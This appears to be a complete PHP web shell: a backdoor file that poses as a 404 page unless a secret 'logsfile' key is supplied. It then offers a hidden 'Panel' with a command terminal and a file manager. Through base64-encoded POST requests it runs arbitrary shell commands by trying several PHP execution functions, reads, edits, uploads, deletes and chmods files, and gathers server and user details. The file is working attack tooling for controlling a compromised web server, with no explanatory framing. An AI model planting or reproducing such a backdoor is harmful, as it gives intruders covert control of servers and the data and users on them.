<?php
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

if (!isset($_REQUEST['_']) || $_REQUEST['_'] != 'logsfile') {
    header("HTTP/1.0 404 Not Found");
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><p>Access Denied</p></body></html>');
}

session_start();
$cwd = isset($_SESSION['d']) ? $_SESSION['d'] : getcwd();
@chdir($cwd);

function r($c) {
    $funcs = json_decode('["system","exec","shell_exec","passthru","popen","proc_open"]');
    $r = '';
    foreach ($funcs as $f) {
        if (function_exists($f)) {
            switch($f) {
                case 'system':
                    ob_start(); @system($c); $r = ob_get_clean(); break;
                case 'exec':
                    $o = array(); @exec($c, $o); $r = join("\n", $o); break;
                case 'shell_exec':
                    $r = @shell_exec($c); break;
                case 'passthru':
                    ob_start(); @passthru($c); $r = ob_get_clean(); break;
                case 'popen':
                    $fp = @popen($c, 'r');
                    if ($fp) {
                        while (!feof($fp)) $r .= fread($fp, 1024);
                        pclose($fp);
                    }
                    break;
            }
            if ($r) break;
        }
    }
    if (!$r) $r = `$c`;
    return $r;
}

if (isset($_POST['x'])) {
    header('Content-Type: application/json');
    $d = json_decode('{"s":0,"d":""}', true);
    $a = $_POST['a'];
    
    switch ($a) {
        case 'cmd':
            $d['d'] = r(base64_decode($_POST['c']));
            $d['s'] = 1;
            break;
            
        case 'cd':
            $p = base64_decode($_POST['p']);
            if (@chdir($p)) {
                $_SESSION['d'] = realpath($p);
                $d['d'] = $_SESSION['d'];
                $d['s'] = 1;
            }
            break;
            
        case 'ls':
            $arr = array();
            $path = isset($_POST['p']) ? base64_decode($_POST['p']) : $cwd;
            $files = @scandir($path);
            if ($files) {
                foreach ($files as $f) {
                    if ($f == '.') continue;
                    $fp = $path . '/' . $f;
                    $arr[] = array(
                        'n' => bin2hex($f),
                        't' => @is_dir($fp) ? 'd' : 'f',
                        's' => @is_file($fp) ? @filesize($fp) : 0,
                        'p' => substr(sprintf('%o', @fileperms($fp)), -4),
                        'm' => @date("Y-m-d H:i", @filemtime($fp)),
                        'o' => function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner($fp))['name'] : @fileowner($fp)
                    );
                }
            }
            $d['d'] = $arr;
            $d['c'] = $path;
            $d['s'] = 1;
            break;
            
        case 'read':
            $file = base64_decode($_POST['f']);
            if (@is_readable($file)) {
                $d['d'] = bin2hex(@file_get_contents($file));
                $d['n'] = basename($file);
                $d['s'] = 1;
            }
            break;
            
        case 'save':
            $file = base64_decode($_POST['f']);
            $content = base64_decode($_POST['c']);
            if (@file_put_contents($file, $content) !== false) {
                $d['s'] = 1;
            }
            break;
            
        case 'upload':
            if (isset($_FILES['f'])) {
                $dest = base64_decode($_POST['d']) . '/' . $_FILES['f']['name'];
                if (@move_uploaded_file($_FILES['f']['tmp_name'], $dest)) {
                    $d['s'] = 1;
                }
            }
            break;
            
        case 'del':
            $f = base64_decode($_POST['f']);
            if (@is_dir($f)) {
                $d['s'] = @rmdir($f) ? 1 : 0;
            } else {
                $d['s'] = @unlink($f) ? 1 : 0;
            }
            break;
            
        case 'ren':
            $old = base64_decode($_POST['o']);
            $new = base64_decode($_POST['n']);
            $d['s'] = @rename($old, $new) ? 1 : 0;
            break;
            
        case 'perm':
            $f = base64_decode($_POST['f']);
            $p = octdec($_POST['p']);
            $d['s'] = @chmod($f, $p) ? 1 : 0;
            break;
            
        case 'info':
            $d['d'] = array(
                'os' => @php_uname(),
                'php' => phpversion(),
                'user' => @get_current_user(),
                'uid' => function_exists('posix_getuid') ? @posix_getuid() : 'N/A',
                'gid' => function_exists('posix_getgid') ? @posix_getgid() : 'N/A',
                'server' => $_SERVER['SERVER_SOFTWARE'],
                'ip' => $_SERVER['SERVER_ADDR'],
                'client' => $_SERVER['REMOTE_ADDR'],
                'safe' => @ini_get('safe_mode') ? 'ON' : 'OFF',
                'disabled' => @ini_get('disable_functions'),
                'tmp' => @sys_get_temp_dir()
            );
            $d['s'] = 1;
            break;
            
        case 'mkdir':
            $dir = base64_decode($_POST['d']);
            $d['s'] = @mkdir($dir, 0777, true) ? 1 : 0;
            break;
            
        case 'touch':
            $f = base64_decode($_POST['f']);
            $d['s'] = @touch($f) ? 1 : 0;
            break;
    }
    
    die(json_encode($d));
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font:11px 'Courier New',monospace}
.h{background:#000;padding:8px;border-bottom:1px solid #0f0;display:flex;justify-content:space-between}
.main{display:flex;height:calc(100vh - 35px)}
.left{width:60%;display:flex;flex-direction:column}
.right{width:40%;border-left:1px solid #0f0;display:flex;flex-direction:column}
.sec{flex:1;display:flex;flex-direction:column;border-bottom:1px solid #111}
.sec-h{background:#000;padding:5px;border-bottom:1px solid #0f0;font-weight:bold}
.sec-b{flex:1;overflow:auto;padding:5px}
.t{width:100%;background:#000;color:#0f0;border:1px solid #0f0;padding:4px;font:inherit}
.b{background:#000;color:#0f0;border:1px solid #0f0;padding:4px 10px;cursor:pointer;font:inherit;margin:2px}
.b:hover{background:#0f0;color:#000}
table{width:100%;border-collapse:collapse}
td{padding:2px 4px;border-bottom:1px solid #111;cursor:pointer}
tr:hover{background:#111}
.d{color:#ff0}
.f{color:#0ff}
.e{color:#f00}
pre{white-space:pre-wrap;word-wrap:break-word}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000}
.modal-content{background:#000;border:1px solid #0f0;padding:20px;margin:10% auto;width:80%;max-width:600px}
.close{color:#0f0;float:right;font-size:20px;cursor:pointer}
.close:hover{color:#f00}
#editor{width:100%;height:400px;background:#000;color:#0f0;border:1px solid #0f0;font-family:monospace;padding:5px}
.tabs{display:flex;background:#000;border-bottom:1px solid #0f0}
.tab{padding:5px 10px;cursor:pointer;border-right:1px solid #111}
.tab.active{background:#0f0;color:#000}
.tab-content{display:none;padding:10px}
.tab-content.active{display:block}
.toolbar{padding:5px;background:#000;border-bottom:1px solid #111}
.status{padding:5px;background:#000;border-top:1px solid #111;font-size:10px}
</style>
</head>
<body>
<div class="h">
    <span>📁 <span id="cwd"><?=$cwd?></span></span>
    <span><?=@get_current_user()?>@<?=@gethostname()?> | PHP <?=phpversion()?></span>
</div>

<div class="main">
    <div class="left">
        <div class="sec" style="flex:0.3">
            <div class="sec-h">🖥️ Terminal</div>
            <div class="sec-b">
                <input type="text" class="t" id="cmd" placeholder="$ command" autofocus>
                <div class="toolbar">
                    <button class="b" onclick="ex()">Execute</button>
                    <button class="b" onclick="document.getElementById('out').innerHTML=''">Clear</button>
                </div>
            </div>
        </div>
        
        <div class="sec" style="flex:0.7">
            <div class="sec-h">📋 Output</div>
            <div class="sec-b" id="out"></div>
        </div>
    </div>
    
    <div class="right">
        <div class="sec">
            <div class="sec-h">📂 File Manager</div>
            <div class="sec-b">
                <div class="toolbar">
                    <input type="text" class="t" id="quickpath" placeholder="Go to path..." style="width:60%;margin-right:5px">
                    <button class="b" onclick="goPath()">Go</button>
                    <button class="b" onclick="ls()">🔄</button>
                    <button class="b" onclick="goUp()">⬆️</button>
                    <button class="b" onclick="showUpload()">📤</button>
                    <button class="b" onclick="newFile()">📄</button>
                    <button class="b" onclick="newDir()">📁</button>
                    <button class="b" onclick="sysInfo()">ℹ️</button>
                </div>
                <table id="ft"></table>
            </div>
        </div>
    </div>
</div>

<div id="modal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal()">&times;</span>
        <div class="tabs">
            <div class="tab active" onclick="switchTab('edit')">Edit</div>
            <div class="tab" onclick="switchTab('upload')">Upload</div>
            <div class="tab" onclick="switchTab('info')">Info</div>
        </div>
        <div class="tab-content active" id="tab-edit">
            <div id="filename" style="padding:5px;color:#ff0"></div>
            <textarea id="editor"></textarea>
            <button class="b" onclick="saveFile()">💾 Save</button>
            <button class="b" onclick="closeModal()">Cancel</button>
        </div>
        <div class="tab-content" id="tab-upload">
            <input type="file" id="upfile" multiple>
            <button class="b" onclick="uploadFiles()">Upload</button>
        </div>
        <div class="tab-content" id="tab-info">
            <pre id="info-content"></pre>
        </div>
    </div>
</div>

<div class="status" id="status">Ready</div>

<script>
var currentFile = '';
var currentPath = '<?=$cwd?>';

function $(id){return document.getElementById(id)}

function b64e(s){return btoa(unescape(encodeURIComponent(s)))}

function hex2str(h){
    var s='';
    for(var i=0;i<h.length;i+=2){
        s+=String.fromCharCode(parseInt(h.substr(i,2),16));
    }
    return s;
}

function ajax(d,cb,f){
    var x=new XMLHttpRequest();
    x.open('POST','',true);
    if(f){
        x.send(f);
    }else{
        x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        var p=[];
        for(var k in d) p.push(k+'='+encodeURIComponent(d[k]));
        x.send('x=1&'+p.join('&'));
    }
    x.onload=function(){
        if(x.status==200){
            try{cb(JSON.parse(x.responseText))}catch(e){cb({s:0,d:'Error'})}
        }
    };
}

function ex(){
    var c=$('cmd').value;
    if(!c)return;
    $('status').textContent='Executing...';
    ajax({a:'cmd',c:b64e(c)},function(r){
        $('out').innerHTML+='<div style="color:#ff0">$ '+esc(c)+'</div><pre>'+esc(r.d)+'</pre>';
        $('out').scrollTop=$('out').scrollHeight;
        $('status').textContent='Ready';
    });
}

function ls(p){
    p=p||currentPath;
    ajax({a:'ls',p:b64e(p)},function(r){
        if(r.s){
            currentPath=r.c;
            $('cwd').textContent=r.c;
            var h='<tr><td>Name</td><td>Size</td><td>Perm</td><td>Owner</td><td>Modified</td><td>Actions</td></tr>';
            r.d.forEach(function(f){
                var fname = hex2str(f.n);
                var cls=f.t=='d'?'d':'f';
                if(fname.match(/\.(jpg|png|gif|ico)$/i)) cls='e';
                h+='<tr><td class="'+cls+'" data-name="'+f.n+'" data-type="'+f.t+'">'+
                   esc(fname)+(f.t=='d'?'/':'')+'</td><td>'+formatSize(f.s)+'</td><td>'+f.p+'</td><td>'+f.o+
                   '</td><td>'+f.m+'</td><td>'+
                   '<span class="b" data-name="'+f.n+'">R</span> '+
                   '<span class="b" data-name="'+f.n+'">D</span> '+
                   '<span class="b" data-name="'+f.n+'" data-perm="'+f.p+'">P</span>'+
                   '</td></tr>';
            });
            $('ft').innerHTML=h;
            
            var cells = $('ft').getElementsByTagName('td');
            for(var i=0; i<cells.length; i++){
                if(cells[i].dataset.name){
                    cells[i].onclick = function(){
                        var name = hex2str(this.dataset.name);
                        if(this.dataset.type == 'd'){
                            cd(name);
                        }else{
                            edit(name);
                        }
                    }
                }
            }
            
            var btns = $('ft').getElementsByClassName('b');
            for(var i=0; i<btns.length; i++){
                btns[i].onclick = function(){
                    var name = hex2str(this.dataset.name);
                    var txt = this.textContent;
                    if(txt == 'R') ren(name);
                    else if(txt == 'D') del(name);
                    else if(txt == 'P') perm(name, this.dataset.perm);
                }
            }
        }
    });
}

function goPath(){
    var p=$('quickpath').value;
    if(p){
        ls(p);
        $('quickpath').value='';
    }
}

function cd(d){
    var np=currentPath+'/'+d;
    ls(np);
}

function goUp(){
    var p=currentPath.split('/');
    p.pop();
    ls(p.join('/')||'/');
}

function edit(f){
    currentFile=currentPath+'/'+f;
    ajax({a:'read',f:b64e(currentFile)},function(r){
        if(r.s){
            $('filename').textContent='Editing: '+r.n;
            $('editor').value=hex2str(r.d);
            showModal();
            switchTab('edit');
        }
    });
}

function saveFile(){
    ajax({a:'save',f:b64e(currentFile),c:b64e($('editor').value)},function(r){
        if(r.s){
            closeModal();
            ls();
            $('status').textContent='File saved';
        }
    });
}

function del(f){
    if(!confirm('Delete '+f+'?'))return;
    ajax({a:'del',f:b64e(currentPath+'/'+f)},function(r){
        ls();
    });
}

function ren(f){
    var n=prompt('New name:',f);
    if(n&&n!=f){
        ajax({a:'ren',o:b64e(currentPath+'/'+f),n:b64e(currentPath+'/'+n)},function(r){
            ls();
        });
    }
}

function perm(f,p){
    var n=prompt('Permissions:',p);
    if(n){
        ajax({a:'perm',f:b64e(currentPath+'/'+f),p:n},function(r){
            ls();
        });
    }
}

function newFile(){
    var n=prompt('File name:');
    if(n){
        ajax({a:'touch',f:b64e(currentPath+'/'+n)},function(r){
            ls();
        });
    }
}

function newDir(){
    var n=prompt('Directory name:');
    if(n){
        ajax({a:'mkdir',d:b64e(currentPath+'/'+n)},function(r){
            ls();
        });
    }
}

function uploadFiles(){
    var files=$('upfile').files;
    if(!files.length)return;
    for(var i=0;i<files.length;i++){
        var fd=new FormData();
        fd.append('x','1');
        fd.append('a','upload');
        fd.append('d',b64e(currentPath));
        fd.append('f',files[i]);
        ajax(null,function(r){
            ls();
        },fd);
    }
    closeModal();
}

function sysInfo(){
    ajax({a:'info'},function(r){
        if(r.s){
            var h='';
            for(var k in r.d){
                h+=k.toUpperCase()+': '+r.d[k]+'\n';
            }
            $('info-content').textContent=h;
            showModal();
            switchTab('info');
        }
    });
}

function showUpload(){
    showModal();
    switchTab('upload');
}

function showModal(){
    $('modal').style.display='block';
}

function closeModal(){
    $('modal').style.display='none';
}

function switchTab(t){
    var tabs=document.querySelectorAll('.tab');
    var contents=document.querySelectorAll('.tab-content');
    tabs.forEach(function(el){el.classList.remove('active')});
    contents.forEach(function(el){el.classList.remove('active')});
    $('tab-'+t).classList.add('active');
    event.target.classList.add('active');
}

function formatSize(s){
    if(s<1024)return s+'B';
    if(s<1048576)return Math.round(s/1024)+'K';
    return Math.round(s/1048576)+'M';
}

function esc(s){
    var e=document.createElement('div');
    e.textContent=s;
    return e.innerHTML;
}

$('cmd').onkeydown=function(e){
    if(e.keyCode==13)ex();
};

window.onclick=function(e){
    if(e.target==$('modal'))closeModal();
};

window.onload=function(){
    ls();
};
</script>
</body>
</html>
